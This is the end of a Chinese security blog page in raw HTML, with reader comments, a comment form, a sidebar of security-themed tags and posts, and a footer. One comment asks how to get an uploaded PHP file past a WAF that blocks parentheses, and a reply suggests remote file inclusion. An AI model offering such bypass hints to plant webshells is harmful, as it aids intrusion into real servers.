                    </div>
                </div>
              </li>
            
              <li class="comment-body" id="comment-3387">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="../static/placeholder.jpg">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">DD</a></div>
                    <p>强,无敌!</p>
                    <span class="comment-time">时间: 2019-08-09 10:15</span>
                    <span class="comment-reply"><a href="#comment-3387" onclick="reply_to('3387','DD')">回复</a></span>
                    </div>
                </div>
              </li>
            
              <li class="comment-body" id="comment-3366">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="https://secure.gravatar.com/avatar/55e8f8694d2aa15aa4514e8d9ce6eeed.jpg?s=100&amp;d=mm&amp;r=g">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">测试</a></div>
                    <p>上传php文件 被waf拦截  原因是文件内容中不能有括号(), 该怎么绕过？</p>
                    <span class="comment-time">时间: 2019-06-19 23:09</span>
                    <span class="comment-reply"><a href="#comment-3366" onclick="reply_to('3366','测试')">回复</a></span>
                    </div>
                </div>
              </li>
            
              <li class="comment-body" id="comment-3441">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="https://secure.gravatar.com/avatar/3ff313bc812406d089a7296fb19c5c33.jpg?s=100&amp;d=mm&amp;r=g">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">爱学习的1x2</a></div>
                    <p>@测试  远程包含函数 远程包含</p>
                    <span class="comment-time">时间: 2019-11-14 02:06</span>
                    <span class="comment-reply"><a href="#comment-3441" onclick="reply_to('3441','爱学习的1x2')">回复</a></span>
                    </div>
                </div>
              </li>
            
              <li class="comment-body" id="comment-3355">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="../static/placeholder.jpg">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">miao</a></div>
                    <p>您好，读了您之前的一篇关于vps安全的文章，请问小白有什么可靠简便的方法检测vps是否有后门/病毒/恶意程序吗？ 用的是cent os</p>
                    <span class="comment-time">时间: 2019-05-27 18:47</span>
                    <span class="comment-reply"><a href="#comment-3355" onclick="reply_to('3355','miao')">回复</a></span>
                    </div>
                </div>
              </li>
            
              <li class="comment-body" id="comment-3462">
                <div class="clearfix">
                    <div class="comment-author">
                        <img src="../static/placeholder.jpg">
                    </div>
                    <div class="comment-meta">
                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">tinmin</a></div>
                    <p>@miao 去github搜一些检测脚本</p>
                    <span class="comment-time">时间: 2019-12-30 17:27</span>
                    <span class="comment-reply"><a href="#comment-3462" onclick="reply_to('3462','tinmin')">回复</a></span>
                    </div>
                </div>
              </li>
            
            
            </ol>
            
        </div>

        <div id="reply"></div>
        <div id="comment-place">
            <div id="comment-post" class="respond none-resize">
             <div id="respond">
                <h3 id="response">添加新评论</h3>
                <form method="post" id="comment-form" role="form" action="#comments">
                    <p>
                        <label for="author" class="required">称呼</label>
                        <input type="text" name="nickname" placeholder="昵称" maxlength="64" required id="id_nickname">
                    </p>
                    <p>
                        <label for="mail">Email</label>
                        <input type="text" name="email" placeholder="邮箱（可留空）" maxlength="254" id="id_email">
                    </p>
                    <p>
                        <label for="url">网站</label>
                        <input type="text" name="url" placeholder="链接（可留空）" maxlength="200" id="id_url">
                    </p>
                    <p>
                        <label for="textarea" class="required">内容</label>
                        <textarea name="content" cols="40" rows="6" required id="id_content">
</textarea>
                    </p>
                    <p>
                        <label style="float:left;">验证码</label>
                        <div class="row gx-2" style="margin-top: 8px"><div class="col-6"><input autocomplete="off" id="id_captcha_1" name="captcha_1" type="text" placeholder="验证码" /> <input id="id_captcha_0" name="captcha_0" type="hidden" value="cb68284fdbd582bef53b13c5ab92333881dba045" />
</div><div class="col-6">
<img src="../captcha/image/cb68284fdbd582bef53b13c5ab92333881dba045/index.png" alt="captcha" class="captcha" /></div></div>
                    </p>
                    <p>
                        <button type="submit" class="submit">提交评论</button>
                        <input type="hidden" name="parent" id="id_parent">
                        <input type="hidden" name="archive" value="443" id="id_archive">
                        <input type="hidden" name="csrfmiddlewaretoken" value="Fxl66nNYWd4gWc0RYt9r9ZUMHBA9f8XNr5JXEsoHkziZuKOf0u6c6sXR2YRkOK95">
                    </p>
                </form>
                </div>
            </div>
        </div>

    </div>
    



<div  class="col-5 columns" id="sidebar" role="complementary">

  <div class="widget widget_search">
    <h3>搜索</h3>
    <form action="https://www.leavesongs.com/search/" id="searchform" method="get">
        <input type="text" id="searchkey" name="keyword" value="" class="searchkey" placeholder="Search..."/>
        <button type="submit"  id="searchsubmit">Go</button>
    </form>
  </div>

  
  <div class="widget">
	<h3 class="widget-title">最新评论</h3>
	<ul class="widget-list" id="recent-comment">
    
    
        <li id="comment" class="clearfix">
            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
            <div class="comments-link"><cite>木木</cite>：<a href="../THINK/europe-trip-2022.html#comment-4523">虽然物价对比不出什么，但是还是觉得很高昂</a></div>
        </li>
    
        <li id="comment" class="clearfix">
            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
            <div class="comments-link"><cite>dongdong4fei</cite>：<a href="../THINK/using-chatgpt-for-antispam.html#comment-4520">肯德基疯狂星期四！ 疯狂星期四！  https://m.kfc.com.cn/wechatco...</a></div>
        </li>
    
        <li id="comment" class="clearfix">
            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
            <div class="comments-link"><cite>dongdong4fei</cite>：<a href="../THINK/using-chatgpt-for-antispam.html#comment-4519">小猪咪小猪咪小猪咪</a></div>
        </li>
    
        <li id="comment" class="clearfix">
            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
            <div class="comments-link"><cite>sam</cite>：<a href="javascript-prototype-pollution-attack.html#comment-4518">还得是P神，文章一看就懂</a></div>
        </li>
    
        <li id="comment" class="clearfix">
            <img class="avatar" src="../static/placeholder.jpg" alt="%s" width="40" height="40">
            <div class="comments-link"><cite>程序</cite>：<a href="discuz72-sql-injection.html#comment-4517">很不错的文章</a></div>
        </li>
    
    </ul>
  </div>

  <div class="widget widget-category">
	<h3>分类</h3>
	<ul id="blogsort" class="widget-list">
    
    
    <li>
        <a href="../sort/PENETRATION.html">网络安全<em>143</em></a>
    </li>
    
    <li>
        <a href="../sort/C.html">C/C++<em>32</em></a>
    </li>
    
    <li>
        <a href="../sort/THINK.html">心得与体会<em>24</em></a>
    </li>
    
    <li>
        <a href="../sort/PYTHON.html">Python<em>19</em></a>
    </li>
    
    <li>
        <a href="../sort/SHARE.html">资源分享<em>16</em></a>
    </li>
    
    </ul>
  </div>

  <div class="widget widget-tag">
	<h3>随机标签</h3>
	<div class="tag-cloud">
        
        
        <a rel="tag" href="../tag/sqlite3_exec.html">sqlite3_exec</a>
        
        <a rel="tag" href="../tag/%E5%AF%92%E5%81%87.html">寒假</a>
        
        <a rel="tag" href="../tag/2019.html">2019</a>
        
        <a rel="tag" href="../tag/xss%E8%A0%95%E8%99%AB.html">xss蠕虫</a>
        
        <a rel="tag" href="../tag/%E5%91%BD%E4%BB%A4%E8%A1%8C.html">命令行</a>
        
        <a rel="tag" href="../tag/php.html">php</a>
        
        <a rel="tag" href="../tag/CRLF.html">CRLF</a>
        
        <a rel="tag" href="../tag/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html">反序列化漏洞</a>
        
        <a rel="tag" href="../tag/VS2010.html">VS2010</a>
        
        <a rel="tag" href="../tag/%E8%B7%A8%E7%9B%AE%E5%BD%95.html">跨目录</a>
        
        <a rel="tag" href="../tag/%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84.html">内存映射</a>
        
        <a rel="tag" href="../tag/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93.html">原型链污染</a>
        
        <a rel="tag" href="../tag/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E.html">越权漏洞</a>
        
        <a rel="tag" href="../tag/%E9%98%BB%E6%AD%A2%E8%84%9A%E6%9C%AC%E8%BF%90%E8%A1%8C.html">阻止脚本运行</a>
        
        <a rel="tag" href="../tag/%E7%AD%94%E6%A1%88.html">答案</a>
        
        <a rel="tag" href="../tag/django.html">django</a>
        
        <a rel="tag" href="../tag/%E6%96%AD%E7%82%B9%E7%BB%AD%E4%BC%A0.html">断点续传</a>
        
        <a rel="tag" href="../tag/%E9%93%BE%E8%A1%A8.html">链表</a>
        
        <a rel="tag" href="../tag/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2.html">信息泄露</a>
        
        <a rel="tag" href="../tag/getshell.html">getshell</a>
        
        <a rel="tag" href="../tag/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html">命令执行漏洞</a>
        
        <a rel="tag" href="../tag/%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86.html">反向代理</a>
        
        <a rel="tag" href="../tag/360webscan.html">360webscan</a>
        
        <a rel="tag" href="../tag/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8.html">前端安全</a>
        
        <a rel="tag" href="../tag/scrapy.html">scrapy</a>
        
        <a rel="tag" href="../tag/API%E5%87%BD%E6%95%B0.html">API函数</a>
        
        <a rel="tag" href="../tag/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89.html">条件竞争</a>
        
        <a rel="tag" href="../tag/webshell.html">webshell</a>
        
        <a rel="tag" href="../tag/%E8%84%B1%E8%A3%A4.html">脱裤</a>
        
        <a rel="tag" href="../tag/SQL.html">SQL</a>
        
    </div>
  </div>

  <div class="widget widget-recent-entries">
	<h3 class="widget-title">热门日志</h3>
	<ul id="hotlog" class="widget-list">
    
    
        <li><a href="../other/tinger.html">About.Me</a></li>
    
        <li><a href="detect-django.html">如何判断目标站点是否为Django开发</a></li>
    
        <li><a href="webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></li>
    
        <li><a href="webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></li>
    
        <li><a href="php-filter-magic.html">谈一谈php://filter的妙用</a></li>
    
    </ul>
  </div>
  

</div>
</div>

<div id="footer">
	<!-- copyright -->
	<div class="container">
		<div class="row remove-bottom">
			<div class="col-6 columns">
			<h3>Little About</h3>
			<p>Phithon 非强迫症小青年  <br>
现居先 <br>
爱好：种花、买书、收藏明信片 <br>
欢迎各大组织收留 <br>
E-mail：root@leavesongs.com </p>
			</div>

			<div class="col-10 columns">

				<h3 class="mobile-hide">Follow me</h3>
        <div id="social-links">
          <a href="http://weibo.com/101yx" class="sweibo" target="_blank" title="新浪微博">新浪微博</a>
          <a href="javascript:alert(/没有腾讯微博哟/)" class="qweibo" target="_blank" title="腾讯微博">腾讯微博</a>
          <a href="javascript:alert(/墙外有什么/);window.open('http://google.com')" class="google" target="_blank" title="墙外的世界">google+</a>
          <a href="https://github.com/phith0n" class="github" target="_blank" title="Github">github</a>
          <a href="javascript:confirm(/mailto:root#leavesongs.com/)" class="mail" target="_blank" title="私信给我">私信给我</a>
          <a href="../feed/index.rss" target="_blank" class="rss" title="离别歌">RSS订阅</a>
        </div>
        <div class="bot-line"></div>
				<p class="copyright">
	Copyright &copy; Powered by talkbook
				&nbsp;&nbsp;<i>Designed and built with all the love in the world by <a href="../index.html" target="_blank">Phithon</a> && deepsky </i>
                    <a href="../index.html">更换模板</a>
				</p>
			</div>
		</div>
	</div>
	<!-- /copyright -->
</div>
<a href="#" id="go-top">Top ↑</a>
<script src="https://cdn.staticfile.org/jquery/1.12.4/jquery.min.js"></script>
<script src="https://cdn.staticfile.org/jquery.appear/0.4.1/jquery.appear.min.js"></script>
<script src="../static/deep/js/common_tpl.js" type="text/javascript"></script>
<script src="../static/deep/js/config.js"></script>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-FF5KPQ1CZ6"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-FF5KPQ1CZ6');
</script>

<script src="https://cdn.staticfile.org/fancybox/2.1.7/js/jquery.fancybox.min.js"></script>
<script>
$(document).ready(function () {
    $(".entry a").each(function (i, e) {
        if(e.host != 'www.leavesongs.com') {
            e.target = '_blank';
        }
    });
    $(".entry img").each(function (i, e) {
        if(e.parentNode.tagName.toUpperCase() != 'A') {
            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
        } else {
            $(e.parentNode).addClass('fancybox');
        }
    });
    $('.fancybox').fancybox();
})
</script>

</body>

</html>